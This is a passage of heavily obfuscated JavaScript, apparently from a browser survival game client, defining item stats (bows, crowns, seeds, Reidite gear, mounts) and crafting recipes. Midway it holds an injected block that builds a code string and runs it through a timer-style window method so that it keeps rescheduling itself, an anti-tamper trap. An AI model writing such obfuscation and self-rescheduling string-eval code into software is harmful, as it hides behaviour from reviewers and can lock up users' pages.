		const ⲆΔⲆᐃⲆⲆⵠⵠΔ = ΔⲆⵠᐃⵠⵠΔ;
		const ⲆⲆΔⲆ = ⵠⵠⵠᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⵠΔⵠΔ] = {
			name: "Diamond bow",
			"ᐃⵠ": Ⲇ.ΔⲆᐃⲆⲆⵠⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⲆⵠⲆⲆ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⲆᐃᐃΔ] = {
			name: "Amethyst bow",
			"ᐃⵠ": Ⲇ.ⲆⲆⲆⲆᐃΔΔ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": 1
		};
		const ⲆⲆΔᐃΔΔⵠ = ⲆⲆⲆⵠᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔΔⵠⵠ] = {
			name: "Reidite bow",
			"ᐃⵠ": Ⲇ.ⲆΔᐃⲆᐃⲆⲆ,
			"ᐃᐃⲆⵠ": ᐃⵠⲆ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃᐃΔⵠᐃ] = {
			name: "Dragon bow",
			"ᐃⵠ": Ⲇ.ⵠⲆⲆΔΔⲆΔ,
			"ᐃᐃⲆⵠ": ⵠⲆᐃⵠ,
			"ⵠⲆⵠΔ": 0
		};
		const ⵠⲆⲆᐃⵠΔⵠ = ᐃᐃᐃⲆⲆᐃⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.Ⲇⵠᐃⵠⵠ] = {
			name: "Crown of life",
			"ᐃⵠ": Ⲇ.ⲆⲆΔΔⲆⵠⲆ,
			"ᐃᐃⲆⵠ": ΔⲆⵠⲆ,
			"ⵠⲆⵠΔ": 0
		};
		const ⲆᐃᐃⵠΔΔᐃΔᐃ = ΔⲆⲆⲆⵠ;
		const ᐃⵠΔⵠⵠ = ⲆⲆⲆΔᐃ;
		const ⲆᐃᐃΔⵠⲆⲆΔⵠ = ⵠⲆⵠⵠⵠⵠᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆⵠᐃⵠ] = {
			name: "Gem of life",
			"ᐃⵠ": Ⲇ.ⵠΔⵠⲆΔⵠΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ⵠᐃⵠᐃΔΔΔ = ⵠⵠⲆⲆⵠ;
		const ⵠⲆⵠⲆΔ = ⲆᐃⲆᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠⵠΔⵠ] = {
			name: "Orb of the dragon",
			"ᐃⵠ": Ⲇ.ΔⲆΔⲆⵠⵠΔ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": ᐃⵠΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔᐃⲆⲆ] = {
			name: "Orb of the dragon",
			"ᐃⵠ": Ⲇ.ⲆⵠⲆΔΔⲆⵠ,
			"ᐃᐃⲆⵠ": ⲆΔⵠ,
			"ⵠⲆⵠΔ": ⵠⲆᐃⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃΔᐃᐃ] = {
			name: "Cube of the dragon",
			"ᐃⵠ": Ⲇ.ᐃΔⲆⲆⲆⲆⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ᐃᐃᐃⵠⵠⲆⵠ = ⵠᐃⲆΔΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔᐃᐃᐃ] = {
			name: "Cube of the dragon",
			"ᐃⵠ": Ⲇ.ⵠⵠΔⵠΔⲆᐃ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": ⵠⲆⲆ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃΔⵠⲆⲆ] = {
			name: "Crown of luck",
			"ᐃⵠ": Ⲇ.ⲆⵠⵠΔⲆⵠᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔⲆⲆ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃⲆᐃᐃ] = {
			name: "Gem of luck",
			"ᐃⵠ": Ⲇ.ⵠᐃᐃᐃⵠᐃⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃᐃΔΔ] = {
			name: "Crown of the angel",
			"ᐃⵠ": Ⲇ.ⵠⵠᐃΔⲆΔΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ⵠᐃⲆᐃᐃΔⵠ = ⵠⵠΔΔᐃⵠⲆ;
		const ⵠᐃⲆⲆⵠΔΔ = ΔⲆⲆΔΔ;
		const ⵠᐃⵠΔⲆⵠⵠ = ΔⵠΔᐃⵠ;
		const ⲆⵠⲆⵠΔⵠᐃ = ΔⲆᐃᐃᐃ;
		const ᐃᐃⲆᐃ = ⵠᐃΔⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃᐃΔⵠΔ] = {
			name: "Gem of the angel",
			"ᐃⵠ": Ⲇ.ⲆⲆΔᐃⲆᐃⵠ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔⲆⲆᐃ] = {
			name: "Dragon heart",
			"ᐃⵠ": Ⲇ.ΔⲆᐃⲆⲆⲆⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔⲆⲆ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃⵠΔΔ] = {
			name: "Lava heart",
			"ᐃⵠ": Ⲇ.ⲆⲆⵠΔⵠᐃᐃ,
			"ᐃᐃⲆⵠ": ⵠⲆᐃⵠ,
			"ⵠⲆⵠΔ": ᐃⵠΔ
		};
		const ΔᐃᐃⲆⲆⲆⲆⲆⲆ = ΔⵠⲆⲆΔΔᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠᐃΔΔ] = {
			name: "Hood",
			"ᐃⵠ": Ⲇ.ⵠⵠⲆⲆⵠᐃΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⲆΔⲆᐃ] = {
			name: "Peasant",
			"ᐃⵠ": Ⲇ.ΔⲆΔΔⵠⵠⲆ,
			"ᐃᐃⲆⵠ": ⲆΔⵠ,
			"ⵠⲆⵠΔ": ΔⲆⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃΔⲆᐃⲆ] = {
			name: "Winter peasant",
			"ᐃⵠ": Ⲇ.ΔⲆΔⵠⲆᐃᐃ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ,
			"ⵠⲆⵠΔ": ᐃΔΔ
		};
		const ΔᐃΔΔ = ᐃΔΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃᐃΔᐃ] = {
			name: "Winter hood",
			"ᐃⵠ": Ⲇ.ⲆⲆᐃᐃᐃⲆⵠ,
			"ᐃᐃⲆⵠ": Δⵠᐃ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠⵠⵠΔ] = {
			name: "Bucket full",
			"ᐃⵠ": Ⲇ.ᐃΔⵠⵠⵠΔᐃ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.Δⵠⵠⵠⵠ] = {
			name: "Bucket empty",
			"ᐃⵠ": Ⲇ.ᐃᐃⵠΔΔΔⵠ,
			"ᐃᐃⲆⵠ": Δⵠᐃ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆᐃΔⵠ] = {
			name: "Well",
			"ᐃⵠ": Ⲇ.ⵠⵠⲆΔⵠⲆΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ⵠᐃⲆΔᐃᐃᐃ = ΔⵠᐃΔⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⵠᐃⲆᐃ] = {
			name: "Sign",
			"ᐃⵠ": Ⲇ.ⵠΔᐃΔⲆΔⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ΔⲆⲆⲆΔⵠΔ = ΔΔᐃΔⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠΔⲆⵠ] = {
			name: "Pumpkin Seed",
			"ᐃⵠ": Ⲇ.ⲆⲆⵠⵠᐃΔⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ᐃⲆⲆΔΔⵠΔ = ΔⲆⵠⵠᐃⲆΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆⲆⵠⲆ] = {
			name: "Garlic Seed",
			"ᐃⵠ": Ⲇ.ⵠΔⲆⲆⵠⲆⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ⲆᐃᐃΔΔ = ᐃΔⲆⵠᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠᐃⵠⲆ] = {
			name: "Thorbushes Seed",
			"ᐃⵠ": Ⲇ.ⲆⲆⲆΔᐃᐃΔ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔⲆᐃⵠ] = {
			name: "Roof",
			"ᐃⵠ": Ⲇ.ⲆⲆⲆⵠⵠⵠΔ,
			"ᐃᐃⲆⵠ": ᐃᐃⵠ,
			"ⵠⲆⵠΔ": 1
		};
		const ΔⲆᐃⵠᐃ = ⲆⵠᐃΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆⲆⲆⲆ] = {
			name: "Crab Crown",
			"ᐃⵠ": Ⲇ.ᐃΔⲆᐃⵠᐃΔ,
			"ᐃᐃⲆⵠ": ΔΔⵠⵠ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃⲆᐃⵠ] = {
			name: "Carrot Seed",
			"ᐃⵠ": Ⲇ.ᐃⵠⲆΔᐃⲆⲆ,
			"ᐃᐃⲆⵠ": ΔⲆⵠⲆ,
			"ⵠⲆⵠΔ": ΔᐃΔΔ
		};
		const ΔᐃⲆⵠⵠ = ᐃⲆᐃᐃⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔⲆᐃΔ] = {
			name: "Tomato Seed",
			"ᐃⵠ": Ⲇ.ΔΔΔΔⵠΔᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔᐃΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃΔⵠⵠⲆ] = {
			name: "Watermelon Seed",
			"ᐃⵠ": Ⲇ.ᐃⲆΔᐃⵠⲆᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔΔⵠⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃⲆⲆΔ] = {
			name: "Aloe Vera Seed",
			"ᐃⵠ": Ⲇ.ᐃⵠⲆⲆⵠⲆⲆ,
			"ᐃᐃⲆⵠ": Δⵠᐃ,
			"ⵠⲆⵠΔ": 0
		};
		const ΔⲆΔᐃᐃⵠΔⲆⲆ = ⵠᐃⲆΔⵠᐃⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⲆΔᐃᐃ] = {
			name: "Cap",
			"ᐃⵠ": Ⲇ.ΔΔⲆᐃⲆⵠⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃΔᐃⲆ
		};
		const ᐃⲆⵠⵠΔΔⲆ = ⵠᐃᐃΔⲆ;
		const ΔⲆᐃᐃ = ⵠΔⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⲆⵠᐃᐃ] = {
			name: "Turban",
			"ᐃⵠ": Ⲇ.ⵠⵠΔⲆΔⲆΔ,
			"ᐃᐃⲆⵠ": Δᐃᐃᐃ,
			"ⵠⲆⵠΔ": ᐃᐃⵠ
		};
		const ⲆⲆⵠᐃⲆΔⲆ = ⵠⲆᐃΔᐃ;
		const ⵠΔᐃΔⵠⲆⵠ = ⵠΔᐃΔᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆⵠΔⵠ] = {
			name: "Pilot Helmet",
			"ᐃⵠ": Ⲇ.ᐃⵠᐃΔᐃᐃΔ,
			"ᐃᐃⲆⵠ": ⲆΔⵠ,
			"ⵠⲆⵠΔ": ⵠΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃΔⲆᐃ] = {
			name: ⵠ[159],
			"ᐃⵠ": Ⲇ.ⲆᐃⲆΔⲆᐃⵠ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": ᐃΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⵠᐃⲆⵠ] = {
			name: ⵠ[159],
			"ᐃⵠ": Ⲇ.ⵠⲆⵠⵠᐃⲆⲆ,
			"ᐃᐃⲆⵠ": ⵠΔⲆⵠ,
			"ⵠⲆⵠΔ": ⵠΔⲆ
		};
		const ⲆⵠᐃΔⲆ = ΔᐃⵠⲆⲆ;
		const ⲆΔⲆᐃ = ᐃⲆⵠΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔΔΔᐃ] = {
			name: ⵠ[159],
			"ᐃⵠ": Ⲇ.ᐃᐃⲆⵠΔⲆᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠΔⵠⵠ] = {
			name: ⵠ[159],
			"ᐃⵠ": Ⲇ.ⲆᐃⲆⵠⵠⵠΔ,
			"ᐃᐃⲆⵠ": ΔΔⵠ,
			"ⵠⲆⵠΔ": Ⲇᐃⵠ
		};
		const ΔΔⵠᐃΔ = ⲆⲆⲆⲆᐃ;
		const ⲆⲆⲆᐃ = ⲆΔⵠ;
		const ⲆⲆᐃⲆΔᐃΔ = ᐃᐃΔᐃⲆⵠᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃᐃΔⲆⲆ] = {
			name: ⵠ[159],
			"ᐃⵠ": Ⲇ.ᐃⲆᐃⲆΔⲆᐃ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃΔⲆᐃ] = {
			name: ⵠ[159],
			"ᐃⵠ": Ⲇ.ᐃⵠΔⲆⲆⲆⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⵠᐃⵠΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃΔⲆᐃᐃ] = {
			name: "Pitchfork",
			"ᐃⵠ": Ⲇ.ⲆΔⲆᐃⵠⲆⵠ,
			"ᐃᐃⲆⵠ": ⲆⲆⲆᐃ,
			"ⵠⲆⵠΔ": ᐃᐃⲆΔ
		};
		const ᐃⵠⲆⵠΔ = ⲆᐃⲆΔΔ;
		const ⲆᐃᐃΔᐃᐃⵠ = ᐃⲆΔΔᐃⵠⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃᐃΔΔⲆ] = {
			name: "Wood Door Spike",
			"ᐃⵠ": Ⲇ.ΔⲆΔⵠᐃΔⵠ,
			"ᐃᐃⲆⵠ": Δᐃᐃᐃ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⲆΔⵠⵠ] = {
			name: "Stone Door Spike",
			"ᐃⵠ": Ⲇ.ⵠΔⲆᐃⵠΔᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ⵠΔΔⲆᐃ = ⲆⲆⲆⵠΔ;
		const ᐃⲆⵠᐃⵠ = ⲆΔⲆΔⲆ;
		const ΔΔᐃᐃⲆⲆΔⲆⲆ = ⵠⵠⵠΔΔΔΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃΔΔⲆ] = {
			name: "Gold Door Spike",
			"ᐃⵠ": Ⲇ.ΔⲆⵠΔⲆᐃⵠ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": 1
		};
		const ⲆᐃⵠⲆⵠ = ⵠᐃΔΔⵠ;
		const ᐃⵠⲆᐃΔⵠᐃ = ⵠⵠⲆⲆⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠⲆᐃᐃ] = {
			name: "Diamond Door Spike",
			"ᐃⵠ": Ⲇ.ᐃⲆΔⵠΔⵠΔ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ,
			"ⵠⲆⵠΔ": 1
		};
		const ᐃⲆᐃⵠΔ = ⵠᐃⵠᐃᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔⵠᐃⲆ] = {
			name: "Amethyst Door Spike",
			"ᐃⵠ": Ⲇ.ⲆⲆⲆⵠⲆΔᐃ,
			"ᐃᐃⲆⵠ": ΔⲆⵠⲆ,
			"ⵠⲆⵠΔ": 1
		};
		const ᐃᐃⲆⲆⲆⲆⲆ = ⲆⵠᐃΔⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⵠᐃⲆⲆ] = {
			name: "Diamond Fire Protection ",
			"ᐃⵠ": Ⲇ.ⲆⲆⲆΔⵠΔⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ⵠⲆᐃⵠⲆᐃⵠⲆⵠ = ΔΔᐃⲆⲆⵠⵠ;
		const ΔᐃΔⲆ = ⲆⲆΔⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃᐃΔΔΔ] = {
			name: "Amethyst Fire Protection ",
			"ᐃⵠ": Ⲇ.ᐃⵠᐃΔⲆΔⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⲆⵠⲆⲆ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠⲆΔᐃ] = {
			name: "Amethyst Fire Protection ",
			"ᐃⵠ": Ⲇ.ᐃΔᐃⲆΔᐃᐃ,
			"ᐃᐃⲆⵠ": ⲆⲆⲆᐃ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠⵠᐃΔ] = {
			name: "Reidite Sword",
			"ᐃⵠ": Ⲇ.ⵠⲆᐃⲆᐃⵠⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔⲆᐃᐃ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠⲆⲆᐃ] = {
			name: "Reidite Spear",
			"ᐃⵠ": Ⲇ.ⲆⲆⵠΔᐃⵠⵠ,
			"ᐃᐃⲆⵠ": ΔⲆⵠⲆ,
			"ⵠⲆⵠΔ": ΔΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠⲆⲆᐃ] = {
			name: "Reidite Helmet",
			"ᐃⵠ": Ⲇ.ⲆⲆᐃΔΔⲆⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠⲆΔⵠ] = {
			name: "Reidite Door Spike",
			"ᐃⵠ": Ⲇ.ᐃⵠⲆᐃᐃⲆΔ,
			"ᐃᐃⲆⵠ": ⵠⲆᐃⵠ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆΔΔⵠ] = {
			name: "Reidite Door",
			"ᐃⵠ": Ⲇ.ⵠΔᐃⵠᐃΔⵠ,
			"ᐃᐃⲆⵠ": ΔΔⵠ,
			"ⵠⲆⵠΔ": ΔⲆᐃᐃ
		};
		const ⲆΔᐃⵠⵠᐃⵠ = ⵠᐃΔⵠⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃⲆᐃⲆ] = {
			name: "Reidite Spike",
			"ᐃⵠ": Ⲇ.ⲆⲆᐃΔⵠᐃⵠ,
			"ᐃᐃⲆⵠ": ΔⲆⵠⲆ,
			"ⵠⲆⵠΔ": ⵠΔΔ
		};
		const ⵠⵠᐃΔⲆ = ⵠⲆⲆΔΔ;
		const ᐃⵠΔⵠΔΔᐃ = ⲆⵠΔⲆⲆⵠⲆ;
		const ΔΔΔᐃᐃⵠΔ = ⵠᐃⵠⲆⲆ;
		const Ⲇⵠⵠᐃ = ⵠΔⲆᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃΔᐃⵠ] = {
			name: "Reidite Wall",
			"ᐃⵠ": Ⲇ.ᐃᐃΔⲆΔᐃΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⵠΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆᐃΔⲆ] = {
			name: "Reidite pick",
			"ᐃⵠ": Ⲇ.ⵠΔΔⵠᐃⲆᐃ,
			"ᐃᐃⲆⵠ": Δᐃᐃᐃ,
			"ⵠⲆⵠΔ": ⵠᐃⵠΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔΔⲆⵠ] = {
			name: "Boat",
			"ᐃⵠ": Ⲇ.ⵠᐃΔⵠⲆⵠⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⵠΔⲆ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃᐃΔΔⵠ] = {
			name: "Sled",
			"ᐃⵠ": Ⲇ.ⲆⲆᐃⵠΔⵠᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ΔⲆᐃⵠⲆΔⵠ = ⵠⲆⲆΔΔ;
		const ⵠⲆΔⲆᐃᐃⲆ = ΔⲆΔⲆⲆ;
		const ⵠⲆᐃⵠⲆᐃΔ = ⵠΔⲆⵠⲆⵠΔ;
		const ⲆⵠⵠⵠⵠᐃΔ = ⵠΔΔⵠⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠΔⲆⲆ] = {
			name: "Saddle",
			"ᐃⵠ": Ⲇ.ⵠⲆⵠΔⲆⲆΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃⵠⵠⲆ] = {
			name: "Mount Boar",
			"ᐃⵠ": Ⲇ.ᐃᐃⵠⲆⵠᐃᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔΔⵠⵠ
		};
		const ᐃᐃⲆΔⵠ = ⲆᐃΔᐃ;
		const ⲆⲆᐃᐃΔⵠⲆⲆᐃ = ΔΔᐃᐃⵠᐃΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⵠᐃᐃΔ] = {
			name: "Mount King Crab",
			"ᐃⵠ": Ⲇ.ⵠⲆⲆΔⲆΔⲆ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ,
			"ⵠⲆⵠΔ": ⵠⲆⲆ
		};
		const ⵠᐃⲆᐃΔⲆⵠ = ᐃⵠⵠⵠΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆᐃⲆᐃ] = {
			name: "Mount Baby Dragon",
			"ᐃⵠ": Ⲇ.ⲆⲆΔⲆᐃΔΔ,
			"ᐃᐃⲆⵠ": ⵠⲆᐃⵠ,
			"ⵠⲆⵠΔ": 0
		};
		const ΔᐃⲆΔⵠⵠᐃΔⵠ = 3097293;

		function ⲆⲆⵠⵠⲆⵠⲆ(ΔⲆΔΔⲆΔΔ) {
			const ΔᐃⲆΔⵠⵠᐃΔⵠ = ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]];
			const ᐃⵠᐃⵠⵠΔⲆⵠΔ = ΔᐃⲆΔⵠⵠᐃΔⵠ;
			const ⲆⲆᐃⵠⲆⵠⵠΔᐃ = function() {
				ΔᐃⲆΔⵠⵠᐃΔⵠ(ⲆⲆᐃⵠⲆⵠⵠΔᐃ, 2426);
				ᐃⵠᐃⵠⵠΔⲆⵠΔ(ⲆⲆᐃⵠⲆⵠⵠΔᐃ, 7077)
			};
			ⲆⲆᐃⵠⲆⵠⵠΔᐃ()
		}
		const ΔⲆΔΔⲆΔΔ = ⲆⲆⵠⵠⲆⵠⲆ + ";" + "let ΔⲆΔΔⲆΔΔ = " + ⲆⲆⵠⵠⲆⵠⲆ + ";";
		const ᐃⵠᐃⵠⵠΔⲆⵠΔ = ΔⲆΔΔⲆΔΔ + "let ⲆⲆᐃⵠⲆⵠⵠΔᐃ = 3492686; try { ⲆⲆᐃⵠⲆⵠⵠΔᐃ = ⲆⲆⵠⵠⲆⵠⲆ; } catch (ΔΔⵠⵠⵠΔΔ) { ΔⲆΔΔⲆΔΔ (); };";
		ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]](ᐃⵠᐃⵠⵠΔⲆⵠΔ, 0);
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠⵠΔⲆ] = {
			name: "Mount Baby Lava",
			"ᐃⵠ": Ⲇ.ΔⲆΔΔⵠⲆⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃⵠΔ
		};
		const ⵠΔΔⵠΔⵠᐃ = ᐃᐃⲆᐃᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔΔⲆⲆ] = {
			name: "Mount Hawk",
			"ᐃⵠ": Ⲇ.ⲆΔΔΔᐃᐃᐃ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": ⲆΔⵠ
		};
		const ᐃΔⲆᐃⵠ = ⲆⵠΔΔᐃ;
		const ⲆΔΔⵠ = ⲆⵠΔΔ;
		const ΔΔⲆᐃⲆΔⵠ = ⲆⵠⲆⵠΔⵠᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃⲆΔᐃ] = {
			name: "Plane",
			"ᐃⵠ": Ⲇ.ΔⲆⵠⵠΔⲆᐃ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": Δⵠᐃ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔᐃⵠΔ] = {
			name: "Pitchfork 2",
			"ᐃⵠ": Ⲇ.ΔᐃⵠⲆΔΔΔ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": ᐃΔΔ
		};
		const ᐃΔᐃⵠΔ = ⲆΔΔⲆΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠᐃⵠⲆ] = {
			name: "Baby Mammoth",
			"ᐃⵠ": Ⲇ.ᐃⵠΔⲆᐃⵠᐃ,
			"ᐃᐃⲆⵠ": ⵠⲆᐃⵠ,
			"ⵠⲆⵠΔ": ⵠⲆⲆ
		};
		var ΔⵠⲆⵠΔΔⲆ = ⵠⵠΔⵠΔ;
		var ⵠⲆⵠᐃΔ = [{
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 25],
				[ᐃᐃ.ᐃᐃΔⲆ, 5]
			],
			w: 0,
			f: 0,
			"ᐃⲆΔ": ΔⲆⵠⲆ,
			e: ᐃⵠⲆ,
			id: ᐃᐃⲆ.ⵠⲆΔᐃΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆΔᐃΔ,
			time: ⵠᐃⵠΔ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆΔᐃΔ, 1],
				[ᐃᐃ.ⵠⲆⲆᐃ, 35],
				[ᐃᐃ.ᐃᐃΔⲆ, 10]
			],
			w: 0,
			f: ᐃⵠΔ,
			"ᐃⲆΔ": ΔⲆⲆ,
			e: ΔⲆⲆ,
			id: ᐃᐃⲆ.ⲆⵠⵠⵠⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠⵠⵠⲆ,
			time: ᐃᐃⵠ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 150],
				[ᐃᐃ.ᐃᐃΔⲆ, 50],
				[ᐃᐃ.ΔⲆⵠⵠ, ΔⲆΔⲆⲆ]
			],
			w: ⵠΔΔ,
			f: 0,
			"ᐃⲆΔ": ⵠⲆⲆ,
			e: ᐃⵠⲆ,
			id: ᐃᐃⲆ.ⵠΔⵠΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠΔⵠΔᐃ,
			time: .05,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 20],
				[ᐃᐃ.ᐃᐃΔⲆ, 10]
			],
			w: Δⵠᐃ,
			f: 0,
			"ᐃⲆΔ": Δⵠᐃ,
			e: Δⵠᐃ,
			id: ᐃᐃⲆ.ᐃⲆⲆΔᐃ,
